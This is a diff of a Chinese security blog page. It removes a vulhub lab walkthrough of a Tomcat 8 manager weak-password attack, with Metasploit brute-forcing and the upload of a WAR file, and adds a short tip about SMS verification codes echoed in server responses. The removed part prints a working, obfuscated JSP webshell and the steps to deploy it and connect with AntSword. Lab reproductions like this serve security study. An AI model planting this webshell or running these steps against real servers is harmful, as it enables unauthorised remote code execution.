@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="影响范围 Tomcat8\n环境搭建 这边就还是用vulhub进行复现\n1 2 3 4 5 cd vulhub-master/tomcat/tomcat8 sudo docker-compose up -d docker ps http://192.168.197.140:8080/ 漏洞复现 这里使用MSF进行复现：\n1 msfconsole 查找与 tomcat 相关的模块\n1 search tomcat 使用 auxiliary/scanner/http/tomcat_mgr_login 模块\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="复现 1 在接收手机验证码时候，可以注意返回的参数，看看收到的验证码有没有回显在相应包 1 有些时候返回的并不是这种明文，而是以base64编码形式或其他形式，在挖掘过程中留意留意 ">
 <title></title>
 
 <link rel='canonical' href='http://localhost:1313/p/'>
 
-<link rel="stylesheet" href="/scss/style.min.699d591a8b6edc7dfab36bec98410d5acfb82ed718f6409590fd68b72a9346ac.css"><meta property='og:title' content="">
-<meta property='og:description' content="影响范围 Tomcat8\n环境搭建 这边就还是用vulhub进行复现\n1 2 3 4 5 cd vulhub-master/tomcat/tomcat8 sudo docker-compose up -d docker ps http://192.168.197.140:8080/ 漏洞复现 这里使用MSF进行复现：\n1 msfconsole 查找与 tomcat 相关的模块\n1 search tomcat 使用 auxiliary/scanner/http/tomcat_mgr_login 模块\n">
+<link rel="stylesheet" href="/scss/style.min.3f80c356f93d6cdfe696883a3b8ecd0c4ad7670e02d4ec7b7c0fcf6cf9bbe703.css"><meta property='og:title' content="">
+<meta property='og:description' content="复现 1 在接收手机验证码时候，可以注意返回的参数，看看收到的验证码有没有回显在相应包 1 有些时候返回的并不是这种明文，而是以base64编码形式或其他形式，在挖掘过程中留意留意 ">
 <meta property='og:url' content='http://localhost:1313/p/'>
 <meta property='og:site_name' content='SlimerのBlog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' />
 <meta name="twitter:title" content="">
-<meta name="twitter:description" content="影响范围 Tomcat8\n环境搭建 这边就还是用vulhub进行复现\n1 2 3 4 5 cd vulhub-master/tomcat/tomcat8 sudo docker-compose up -d docker ps http://192.168.197.140:8080/ 漏洞复现 这里使用MSF进行复现：\n1 msfconsole 查找与 tomcat 相关的模块\n1 search tomcat 使用 auxiliary/scanner/http/tomcat_mgr_login 模块\n">
+<meta name="twitter:description" content="复现 1 在接收手机验证码时候，可以注意返回的参数，看看收到的验证码有没有回显在相应包 1 有些时候返回的并不是这种明文，而是以base64编码形式或其他形式，在挖掘过程中留意留意 ">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -209,40 +209,7 @@
     </ol>
 </aside>
 
-    <aside class="sidebar right-sidebar sticky">
-        
-            
-                
-    <section class="widget archives">
-        <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">目录</h2>
-        
-        <div class="widget--toc">
-            <nav id="TableOfContents">
-  <ul>
-    <li><a href="#影响范围">影响范围</a></li>
-    <li><a href="#环境搭建">环境搭建</a></li>
-    <li><a href="#漏洞复现">漏洞复现</a></li>
-  </ul>
-</nav>
-        </div>
-    </section>
-
-            
-        
-    </aside>
-
+    
 
             <main class="main full-width">
     <article class="main-article">
@@ -274,125 +241,26 @@
     <section class="article-content">
     
     
-    <h1 id="影响范围">影响范围</h1>
-<p>Tomcat8</p>
-<h1 id="环境搭建">环境搭建</h1>
-<p>这边就还是用vulhub进行复现</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd vulhub-master/tomcat/tomcat8
-</span></span><span class="line"><span class="cl">sudo docker-compose up -d
-</span></span><span class="line"><span class="cl">docker ps
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">http://192.168.197.140:8080/
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141819.png" alt="image.png"></p>
-<h1 id="漏洞复现">漏洞复现</h1>
-<p>这里使用MSF进行复现：</p>
+    <h1 id="复现">复现</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfconsole
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在接收手机验证码时候，可以注意返回的参数，看看收到的验证码有没有回显在相应包
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141926.png" alt="image.png"><br>
-<strong>查找与 tomcat 相关的模块</strong></p>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912141347.png" alt=""><br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912141352.png" alt="image.png"></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">search tomcat
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">有些时候返回的并不是这种明文，而是以base64编码形式或其他形式，在挖掘过程中留意留意
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>使用 auxiliary/scanner/http/tomcat_mgr_login 模块</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/http/tomcat_mgr_login 
-</span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>查看需要填写哪些参数</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">show options
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>将 rhosts 设置为目标机</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set rhosts 172.16.2.174
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>进行爆破</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904142741.png" alt="image.png"><br>
-这里成功爆破出账号/密码：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[+] 192.168.197.140:8080 - Login Successful: tomcat:tomcat
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>点击 Manager App 进行登录</strong><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155742.png" alt="image.png"><br>
-<strong>登录后找到上传点</strong><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155816.png" alt="image.png"><br>
-将带有一句话的111.jsp文件压缩成zip，并且将压缩后的zip文件改名为111.war<br>
-jsp 一句话木马，密码为123</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%  String H9991 = request.getParameter(&#34;123&#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &#34;&#34;;for (int i = 0; i &lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>上传111.war文件</strong><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160012.png" alt="image.png"><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160033.png" alt="image.png"><br>
-访问 172.16.2.174:8080/11/11.jsp，无任何回显。（这里我的码错了，方法都是一样的，我又重新上传了一下）<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161029.png" alt="image.png"></p>
-<p><strong>上蚁剑</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.197.140:8080/11/11.jsp
-</span></span><span class="line"><span class="cl">密码：pass
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161012.png" alt="image.png"></p>
-
 </section>
 
 
